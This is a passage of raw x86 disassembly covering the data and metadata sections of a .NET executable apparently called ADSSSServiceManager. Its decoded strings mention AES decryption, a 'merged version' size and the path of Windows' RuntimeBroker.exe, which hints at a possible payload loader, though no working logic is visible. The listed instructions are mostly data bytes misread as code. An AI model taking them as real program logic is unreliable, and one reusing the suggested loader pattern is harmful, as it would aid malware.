  4036a4:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  4036a8:	00 20                	add    %ah,(%eax)
  4036aa:	00 55 00             	add    %dl,0x0(%ebp)
  4036ad:	73 00                	jae    0x4036af
  4036af:	65 00 20             	add    %ah,%gs:(%eax)
  4036b2:	00 31                	add    %dh,(%ecx)
  4036b4:	00 36                	add    %dh,(%esi)
  4036b6:	00 20                	add    %ah,(%eax)
  4036b8:	00 62 00             	add    %ah,0x0(%edx)
  4036bb:	79 00                	jns    0x4036bd
  4036bd:	74 00                	je     0x4036bf
  4036bf:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4036c3:	20 00                	and    %al,(%eax)
  4036c5:	28 00                	sub    %al,(%eax)
  4036c7:	41                   	inc    %ecx
  4036c8:	00 45 00             	add    %al,0x0(%ebp)
  4036cb:	53                   	push   %ebx
  4036cc:	00 2d 00 31 00 32    	add    %ch,0x32003100
  4036d2:	00 38                	add    %bh,(%eax)
  4036d4:	00 29                	add    %ch,(%ecx)
  4036d6:	00 20                	add    %ah,(%eax)
  4036d8:	00 6f 00             	add    %ch,0x0(%edi)
  4036db:	72 00                	jb     0x4036dd
  4036dd:	20 00                	and    %al,(%eax)
  4036df:	33 00                	xor    (%eax),%eax
  4036e1:	32 00                	xor    (%eax),%al
  4036e3:	20 00                	and    %al,(%eax)
  4036e5:	62 00                	bound  %eax,(%eax)
  4036e7:	79 00                	jns    0x4036e9
  4036e9:	74 00                	je     0x4036eb
  4036eb:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4036ef:	20 00                	and    %al,(%eax)
  4036f1:	28 00                	sub    %al,(%eax)
  4036f3:	41                   	inc    %ecx
  4036f4:	00 45 00             	add    %al,0x0(%ebp)
  4036f7:	53                   	push   %ebx
  4036f8:	00 2d 00 32 00 35    	add    %ch,0x35003200
  4036fe:	00 36                	add    %dh,(%esi)
  403700:	00 29                	add    %ch,(%ecx)
  403702:	00 01                	add    %al,(%ecx)
  403704:	27                   	daa
  403705:	44                   	inc    %esp
  403706:	00 65 00             	add    %ah,0x0(%ebp)
  403709:	63 00                	arpl   %eax,(%eax)
  40370b:	72 00                	jb     0x40370d
  40370d:	79 00                	jns    0x40370f
  40370f:	70 00                	jo     0x403711
  403711:	74 00                	je     0x403713
  403713:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403719:	20 00                	and    %al,(%eax)
  40371b:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40371f:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  403725:	64 00 3a             	add    %bh,%fs:(%edx)
  403728:	00 20                	add    %ah,(%eax)
  40372a:	00 00                	add    %al,(%eax)
  40372c:	3d 4d 00 65 00       	cmp    $0x65004d,%eax
  403731:	72 00                	jb     0x403733
  403733:	67 00 65 00          	add    %ah,0x0(%di)
  403737:	64 00 20             	add    %ah,%fs:(%eax)
  40373a:	00 76 00             	add    %dh,0x0(%esi)
  40373d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403741:	73 00                	jae    0x403743
  403743:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403749:	20 00                	and    %al,(%eax)
  40374b:	73 00                	jae    0x40374d
  40374d:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  403753:	3a 00                	cmp    (%eax),%al
  403755:	20 00                	and    %al,(%eax)
  403757:	7b 00                	jnp    0x403759
  403759:	30 00                	xor    %al,(%eax)
  40375b:	7d 00                	jge    0x40375d
  40375d:	20 00                	and    %al,(%eax)
  40375f:	62 00                	bound  %eax,(%eax)
  403761:	79 00                	jns    0x403763
  403763:	74 00                	je     0x403765
  403765:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403769:	00 4b 43             	add    %cl,0x43(%ebx)
  40376c:	00 3a                	add    %bh,(%edx)
  40376e:	00 5c 00 57          	add    %bl,0x57(%eax,%eax,1)
  403772:	00 69 00             	add    %ch,0x0(%ecx)
  403775:	6e                   	outsb  %ds:(%esi),(%dx)
  403776:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40377a:	00 77 00             	add    %dh,0x0(%edi)
  40377d:	73 00                	jae    0x40377f
  40377f:	5c                   	pop    %esp
  403780:	00 53 00             	add    %dl,0x0(%ebx)
  403783:	79 00                	jns    0x403785
  403785:	73 00                	jae    0x403787
  403787:	74 00                	je     0x403789
  403789:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40378d:	33 00                	xor    (%eax),%eax
  40378f:	32 00                	xor    (%eax),%al
  403791:	5c                   	pop    %esp
  403792:	00 52 00             	add    %dl,0x0(%edx)
  403795:	75 00                	jne    0x403797
  403797:	6e                   	outsb  %ds:(%esi),(%dx)
  403798:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40379c:	00 6d 00             	add    %ch,0x0(%ebp)
  40379f:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  4037a3:	72 00                	jb     0x4037a5
  4037a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4037a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4037a9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4037ad:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4037b1:	78 00                	js     0x4037b3
  4037b3:	65 00 00             	add    %al,%gs:(%eax)
  4037b6:	27                   	daa
  4037b7:	43                   	inc    %ebx
  4037b8:	00 3a                	add    %bh,(%edx)
  4037ba:	00 5c 00 57          	add    %bl,0x57(%eax,%eax,1)
  4037be:	00 69 00             	add    %ch,0x0(%ecx)
  4037c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4037c2:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4037c6:	00 77 00             	add    %dh,0x0(%edi)
  4037c9:	73 00                	jae    0x4037cb
  4037cb:	5c                   	pop    %esp
  4037cc:	00 53 00             	add    %dl,0x0(%ebx)
  4037cf:	79 00                	jns    0x4037d1
  4037d1:	73 00                	jae    0x4037d3
  4037d3:	74 00                	je     0x4037d5
  4037d5:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4037d9:	33 00                	xor    (%eax),%eax
  4037db:	32 00                	xor    (%eax),%al
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	00 64 67 0a          	add    %ah,0xa(%edi,%eiz,2)
  4037e3:	79 83                	jns    0x403768
  4037e5:	94                   	xchg   %eax,%esp
  4037e6:	87 4a a8             	xchg   %ecx,-0x58(%edx)
  4037e9:	81 59 d0 47 b3 1f ef 	sbbl   $0xef1fb347,-0x30(%ecx)
  4037f0:	00 04 20             	add    %al,(%eax,%eiz,1)
  4037f3:	01 01                	add    %eax,(%ecx)
  4037f5:	08 03                	or     %al,(%ebx)
  4037f7:	20 00                	and    %al,(%eax)
  4037f9:	01 05 20 01 01 11    	add    %eax,0x11010120
  4037ff:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  403802:	01 01                	add    %eax,(%ecx)
  403804:	0e                   	push   %cs
  403805:	04 20                	add    $0x20,%al
  403807:	01 01                	add    %eax,(%ecx)
  403809:	02 04 00             	add    (%eax,%eax,1),%al
  40380c:	01 01                	add    %eax,(%ecx)
  40380e:	0e                   	push   %cs
  40380f:	0a 07                	or     (%edi),%al
  403811:	06                   	push   %es
  403812:	1d 05 02 02 08       	sbb    $0x8020205,%eax
  403817:	02 1d 05 06 20 02    	add    0x2200605,%bl
  40381d:	02 0e                	add    (%esi),%cl
  40381f:	11 65 04             	adc    %esp,0x4(%ebp)
  403822:	20 01                	and    %al,(%ecx)
  403824:	0e                   	push   %cs
  403825:	08 03                	or     %al,(%ebx)
  403827:	20 00                	and    %al,(%eax)
  403829:	08 05 20 02 0e 08    	or     %al,0x80e0220
  40382f:	08 05 00 02 05 0e    	or     %al,0xe050200
  403835:	08 0a                	or     %cl,(%edx)
  403837:	07                   	pop    %es
  403838:	04 12                	add    $0x12,%al
  40383a:	45                   	inc    %ebp
  40383b:	12 49 1d             	adc    0x1d(%ecx),%cl
  40383e:	05 12 49 04 00       	add    $0x44912,%eax
  403843:	00 12                	add    %dl,(%edx)
  403845:	45                   	inc    %ebp
  403846:	05 20 01 01 1d       	add    $0x1d010120,%eax
  40384b:	05 05 20 01 01       	add    $0x1012005,%eax
  403850:	11 79 05             	adc    %edi,0x5(%ecx)
  403853:	20 01                	and    %al,(%ecx)
  403855:	01 11                	add    %edx,(%ecx)
  403857:	7d 04                	jge    0x40385d
  403859:	20 00                	and    %al,(%eax)
  40385b:	12 49 08             	adc    0x8(%ecx),%cl
  40385e:	20 03                	and    %al,(%ebx)
  403860:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  403865:	08 2e                	or     %ch,(%esi)
  403867:	07                   	pop    %es
  403868:	22 0e                	and    (%esi),%cl
  40386a:	0e                   	push   %cs
  40386b:	02 0e                	add    (%esi),%cl
  40386d:	0e                   	push   %cs
  40386e:	08 1d 05 1d 05 1d    	or     %bl,0x1d051d05
  403874:	05 1d 05 11 10       	add    $0x1011051d,%eax
  403879:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  40387c:	19 02                	sbb    %eax,(%edx)
  40387e:	08 08                	or     %cl,(%eax)
  403880:	0e                   	push   %cs
  403881:	0e                   	push   %cs
  403882:	09 02                	or     %eax,(%edx)
  403884:	02 02                	add    (%edx),%al
  403886:	12 4d 02             	adc    0x2(%ebp),%cl
  403889:	0e                   	push   %cs
  40388a:	02 0e                	add    (%esi),%cl
  40388c:	12 51 02             	adc    0x2(%ecx),%dl
  40388f:	02 12                	add    (%edx),%dl
  403891:	51                   	push   %ecx
  403892:	02 12                	add    (%edx),%dl
  403894:	51                   	push   %ecx
  403895:	05 00 02 02 0e       	add    $0xe020200,%eax
  40389a:	0e                   	push   %cs
  40389b:	04 00                	add    $0x0,%al
  40389d:	01 08                	add    %ecx,(%eax)
  40389f:	0e                   	push   %cs
  4038a0:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  4038a5:	0e                   	push   %cs
  4038a6:	04 00                	add    $0x0,%al
  4038a8:	01 02                	add    %eax,(%edx)
  4038aa:	0e                   	push   %cs
  4038ab:	09 20                	or     %esp,(%eax)
  4038ad:	01 15 12 80 89 01    	add    %edx,0x1898012
  4038b3:	0e                   	push   %cs
  4038b4:	0e                   	push   %cs
  4038b5:	06                   	push   %es
  4038b6:	15 12 80 89 01       	adc    $0x1898012,%eax
  4038bb:	0e                   	push   %cs
  4038bc:	04 20                	add    $0x20,%al
  4038be:	00 13                	add    %dl,(%ebx)
  4038c0:	00 03                	add    %al,(%ebx)
  4038c2:	20 00                	and    %al,(%eax)
  4038c4:	0e                   	push   %cs
  4038c5:	05 00 01 1d 05       	add    $0x51d0100,%eax
  4038ca:	0e                   	push   %cs
  4038cb:	0a 20                	or     (%eax),%ah
  4038cd:	01 15 12 80 89 01    	add    %edx,0x1898012
  4038d3:	1d 05 0e 07 15       	sbb    $0x15070e05,%eax
  4038d8:	12 80 89 01 1d 05    	adc    0x51d0189(%eax),%al
  4038de:	04 00                	add    $0x0,%al
  4038e0:	01 0e                	add    %ecx,(%esi)
  4038e2:	0e                   	push   %cs
  4038e3:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  4038e8:	1c 08                	sbb    $0x8,%al
  4038ea:	00 01                	add    %al,(%ecx)
  4038ec:	12 80 91 11 80 95    	adc    -0x6a7fee6f(%eax),%al
  4038f2:	06                   	push   %es
  4038f3:	00 01                	add    %al,(%ecx)
  4038f5:	08 12                	or     %dl,(%edx)
  4038f7:	80 91 02 06 18 04 07 	adcb   $0x7,0x4180602(%ecx)
  4038fe:	02 09                	add    (%ecx),%cl
  403900:	08 04 20             	or     %al,(%eax,%eiz,1)
  403903:	01 03                	add    %eax,(%ebx)
  403905:	08 08                	or     %cl,(%eax)
  403907:	b7 7a                	mov    $0x7a,%bh
  403909:	5c                   	pop    %esp
  40390a:	56                   	push   %esi
  40390b:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40390e:	89 08                	mov    %ecx,(%eax)
  403910:	b0 3f                	mov    $0x3f,%al
  403912:	5f                   	pop    %edi
  403913:	7f 11                	jg     0x403926
  403915:	d5 0a                	aad    $0xa
  403917:	3a 04 04             	cmp    (%esp,%eax,1),%al
  40391a:	00 00                	add    %al,(%eax)
  40391c:	00 04 01             	add    %al,(%ecx,%eax,1)
  40391f:	00 00                	add    %al,(%eax)
  403921:	00 04 00             	add    %al,(%eax,%eax,1)
  403924:	10 00                	adc    %al,(%eax)
  403926:	00 04 00             	add    %al,(%eax,%eax,1)
  403929:	20 00                	and    %al,(%eax)
  40392b:	00 04 40             	add    %al,(%eax,%eax,2)
  40392e:	00 00                	add    %al,(%eax)
  403930:	00 02                	add    %al,(%edx)
  403932:	06                   	push   %es
  403933:	08 02                	or     %al,(%edx)
  403935:	06                   	push   %es
  403936:	09 02                	or     %eax,(%edx)
  403938:	06                   	push   %es
  403939:	06                   	push   %es
  40393a:	11 00                	adc    %eax,(%eax)
  40393c:	0a 02                	or     (%edx),%al
  40393e:	0e                   	push   %cs
  40393f:	0e                   	push   %cs
  403940:	18 18                	sbb    %bl,(%eax)
  403942:	02 08                	add    (%eax),%cl
  403944:	18 0e                	sbb    %cl,(%esi)
  403946:	10 11                	adc    %dl,(%ecx)
  403948:	10 10                	adc    %dl,(%eax)
  40394a:	11 14 08             	adc    %edx,(%eax,%ecx,1)
  40394d:	00 05 18 18 18 09    	add    %al,0x9181818
  403953:	09 09                	or     %ecx,(%ecx)
  403955:	0a 00                	or     (%eax),%al
  403957:	05 02 18 18 1d       	add    $0x1d181802,%eax
  40395c:	05 09 10 19 06       	add    $0x6191009,%eax
  403961:	00 03                	add    %al,(%ebx)
  403963:	09 18                	or     %ebx,(%eax)
  403965:	18 18                	sbb    %bl,(%eax)
  403967:	04 00                	add    $0x0,%al
  403969:	01 09                	add    %ecx,(%ecx)
  40396b:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40396e:	01 02                	add    %eax,(%edx)
  403970:	18 03                	sbb    %al,(%ebx)
  403972:	00 00                	add    %al,(%eax)
  403974:	01 0a                	add    %ecx,(%edx)
  403976:	00 03                	add    %al,(%ebx)
  403978:	1d 05 1d 05 1d       	sbb    $0x1d051d05,%eax
  40397d:	05 1d 05 05 00       	add    $0x5051d,%eax
  403982:	01 08                	add    %ecx,(%eax)
  403984:	1d 0e 04 00 01       	sbb    $0x100040e,%eax
  403989:	09 0e                	or     %ecx,(%esi)
  40398b:	08 01                	or     %al,(%ecx)
  40398d:	00 08                	add    %cl,(%eax)
  40398f:	00 00                	add    %al,(%eax)
  403991:	00 00                	add    %al,(%eax)
  403993:	00 1e                	add    %bl,(%esi)
  403995:	01 00                	add    %eax,(%eax)
  403997:	01 00                	add    %eax,(%eax)
  403999:	54                   	push   %esp
  40399a:	02 16                	add    (%esi),%dl
  40399c:	57                   	push   %edi
  40399d:	72 61                	jb     0x403a00
  40399f:	70 4e                	jo     0x4039ef
  4039a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4039a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4039a3:	45                   	inc    %ebp
  4039a4:	78 63                	js     0x403a09
  4039a6:	65 70 74             	gs jo  0x403a1d
  4039a9:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4039b0:	77 73                	ja     0x403a25
  4039b2:	01 08                	add    %ecx,(%eax)
  4039b4:	01 00                	add    %eax,(%eax)
  4039b6:	07                   	pop    %es
  4039b7:	01 00                	add    %eax,(%eax)
  4039b9:	00 00                	add    %al,(%eax)
  4039bb:	00 17                	add    %dl,(%edi)
  4039bd:	01 00                	add    %eax,(%eax)
  4039bf:	12 41 44             	adc    0x44(%ecx),%al
  4039c2:	53                   	push   %ebx
  4039c3:	53                   	push   %ebx
  4039c4:	53                   	push   %ebx
  4039c5:	65 72 76             	gs jb  0x403a3e
  4039c8:	69 63 65 4d 61 6e 61 	imul   $0x616e614d,0x65(%ebx),%esp
  4039cf:	67 65 72 00          	addr16 gs jb 0x4039d3
  4039d3:	00 05 01 00 00 00    	add    %al,0x1
  4039d9:	00 17                	add    %dl,(%edi)
  4039db:	01 00                	add    %eax,(%eax)
  4039dd:	12 43 6f             	adc    0x6f(%ebx),%al
  4039e0:	70 79                	jo     0x403a5b
  4039e2:	72 69                	jb     0x403a4d
  4039e4:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  4039ea:	20 20                	and    %ah,(%eax)
  4039ec:	32 30                	xor    (%eax),%dh
  4039ee:	32 35 00 00 29 01    	xor    0x1290000,%dh
  4039f4:	00 24 39             	add    %ah,(%ecx,%edi,1)
  4039f7:	32 32                	xor    (%edx),%dh
  4039f9:	31 33                	xor    %esi,(%ebx)
  4039fb:	39 30                	cmp    %esi,(%eax)
  4039fd:	65 2d 64 31 31 62    	gs sub $0x62313164,%eax
  403a03:	2d 34 36 61 37       	sub    $0x37613634,%eax
  403a08:	2d 39 30 34 61       	sub    $0x61343039,%eax
  403a0d:	2d 38 30 39 64       	sub    $0x64393038,%eax
  403a12:	63 36                	arpl   %esi,(%esi)
  403a14:	61                   	popa
  403a15:	36 37                	ss aaa
  403a17:	35 33 31 00 00       	xor    $0x3133,%eax
  403a1c:	0c 01                	or     $0x1,%al
  403a1e:	00 07                	add    %al,(%edi)
  403a20:	31 2e                	xor    %ebp,(%esi)
  403a22:	30 2e                	xor    %ch,(%esi)
  403a24:	30 2e                	xor    %ch,(%esi)
  403a26:	30 00                	xor    %al,(%eax)
  403a28:	00 49 01             	add    %cl,0x1(%ecx)
  403a2b:	00 1a                	add    %bl,(%edx)
  403a2d:	2e 4e                	cs dec %esi
  403a2f:	45                   	inc    %ebp
  403a30:	54                   	push   %esp
  403a31:	46                   	inc    %esi
  403a32:	72 61                	jb     0x403a95
  403a34:	6d                   	insl   (%dx),%es:(%edi)
  403a35:	65 77 6f             	gs ja  0x403aa7
  403a38:	72 6b                	jb     0x403aa5
  403a3a:	2c 56                	sub    $0x56,%al
  403a3c:	65 72 73             	gs jb  0x403ab2
  403a3f:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  403a46:	38 01                	cmp    %al,(%ecx)
  403a48:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  403a4c:	46                   	inc    %esi
  403a4d:	72 61                	jb     0x403ab0
  403a4f:	6d                   	insl   (%dx),%es:(%edi)
  403a50:	65 77 6f             	gs ja  0x403ac2
  403a53:	72 6b                	jb     0x403ac0
  403a55:	44                   	inc    %esp
  403a56:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  403a5d:	61                   	popa
  403a5e:	6d                   	insl   (%dx),%es:(%edi)
  403a5f:	65 12 2e             	adc    %gs:(%esi),%ch
  403a62:	4e                   	dec    %esi
  403a63:	45                   	inc    %ebp
  403a64:	54                   	push   %esp
  403a65:	20 46 72             	and    %al,0x72(%esi)
  403a68:	61                   	popa
  403a69:	6d                   	insl   (%dx),%es:(%edi)
  403a6a:	65 77 6f             	gs ja  0x403adc
  403a6d:	72 6b                	jb     0x403ada
  403a6f:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  403a72:	38 00                	cmp    %al,(%eax)
  403a74:	00 00                	add    %al,(%eax)
  403a76:	00 00                	add    %al,(%eax)
  403a78:	3c f8                	cmp    $0xf8,%al
  403a7a:	9f                   	lahf
  403a7b:	d8 00                	fadds  (%eax)
  403a7d:	00 00                	add    %al,(%eax)
  403a7f:	00 02                	add    %al,(%edx)
  403a81:	00 00                	add    %al,(%eax)
  403a83:	00 7b 00             	add    %bh,0x0(%ebx)
  403a86:	00 00                	add    %al,(%eax)
  403a88:	ac                   	lods   %ds:(%esi),%al
  403a89:	3a 00                	cmp    (%eax),%al
  403a8b:	00 ac 1c 00 00 00 00 	add    %ch,0x0(%esp,%ebx,1)
	...
  403a9a:	00 00                	add    %al,(%eax)
  403a9c:	10 00                	adc    %al,(%eax)
	...
  403aaa:	00 00                	add    %al,(%eax)
  403aac:	52                   	push   %edx
  403aad:	53                   	push   %ebx
  403aae:	44                   	inc    %esp
  403aaf:	53                   	push   %ebx
  403ab0:	7d 0d                	jge    0x403abf
  403ab2:	31 74 26 fc          	xor    %esi,-0x4(%esi,%eiz,1)
  403ab6:	e9 4a b5 26 1a       	jmp    0x1a66f005
  403abb:	85 da                	test   %ebx,%edx
  403abd:	c3                   	ret
  403abe:	33 9c 01 00 00 00 43 	xor    0x43000000(%ecx,%eax,1),%ebx
  403ac5:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  403ac9:	65 72 73             	gs jb  0x403b3f
  403acc:	5c                   	pop    %esp
  403acd:	74 75                	je     0x403b44
  403acf:	6e                   	outsb  %ds:(%esi),(%dx)
  403ad0:	67 6e                	outsb  %ds:(%si),(%dx)
  403ad2:	5c                   	pop    %esp
  403ad3:	73 6f                	jae    0x403b44
  403ad5:	75 72                	jne    0x403b49
  403ad7:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  403ada:	72 65                	jb     0x403b41
  403adc:	70 6f                	jo     0x403b4d
  403ade:	73 5c                	jae    0x403b3c
  403ae0:	41                   	inc    %ecx
  403ae1:	44                   	inc    %esp
  403ae2:	53                   	push   %ebx
  403ae3:	53                   	push   %ebx
  403ae4:	53                   	push   %ebx
  403ae5:	65 72 76             	gs jb  0x403b5e
  403ae8:	69 63 65 4d 61 6e 61 	imul   $0x616e614d,0x65(%ebx),%esp
  403aef:	67 65 72 5c          	addr16 gs jb 0x403b4f
  403af3:	41                   	inc    %ecx
  403af4:	44                   	inc    %esp
  403af5:	53                   	push   %ebx
  403af6:	53                   	push   %ebx
  403af7:	53                   	push   %ebx
  403af8:	65 72 76             	gs jb  0x403b71
  403afb:	69 63 65 4d 61 6e 61 	imul   $0x616e614d,0x65(%ebx),%esp
  403b02:	67 65 72 5c          	addr16 gs jb 0x403b62
  403b06:	6f                   	outsl  %ds:(%esi),(%dx)
  403b07:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  403b0a:	44                   	inc    %esp
  403b0b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  403b0f:	5c                   	pop    %esp
  403b10:	41                   	inc    %ecx
  403b11:	44                   	inc    %esp
  403b12:	53                   	push   %ebx
  403b13:	53                   	push   %ebx
  403b14:	53                   	push   %ebx
  403b15:	65 72 76             	gs jb  0x403b8e
  403b18:	69 63 65 4d 61 6e 61 	imul   $0x616e614d,0x65(%ebx),%esp
  403b1f:	67 65 72 2e          	addr16 gs jb 0x403b51
  403b23:	70 64                	jo     0x403b89
  403b25:	62 00                	bound  %eax,(%eax)
  403b27:	4f                   	dec    %edi
  403b28:	3b 00                	cmp    (%eax),%eax
	...
  403b32:	00 69 3b             	add    %ch,0x3b(%ecx)
  403b35:	00 00                	add    %al,(%eax)
  403b37:	00 20                	add    %ah,(%eax)
	...
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	5b                   	pop    %ebx
  403b50:	3b 00                	cmp    (%eax),%eax
	...
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	00 5f 43             	add    %bl,0x43(%edi)
  403b5f:	6f                   	outsl  %ds:(%esi),(%dx)
  403b60:	72 45                	jb     0x403ba7
  403b62:	78 65                	js     0x403bc9
  403b64:	4d                   	dec    %ebp
  403b65:	61                   	popa
  403b66:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  403b6d:	72 65                	jb     0x403bd4
  403b6f:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  403b73:	6c                   	insb   (%dx),%es:(%edi)
  403b74:	00 00                	add    %al,(%eax)
  403b76:	00 00                	add    %al,(%eax)
  403b78:	00 00                	add    %al,(%eax)
  403b7a:	ff 25 00 20 40 00    	jmp    *0x402000
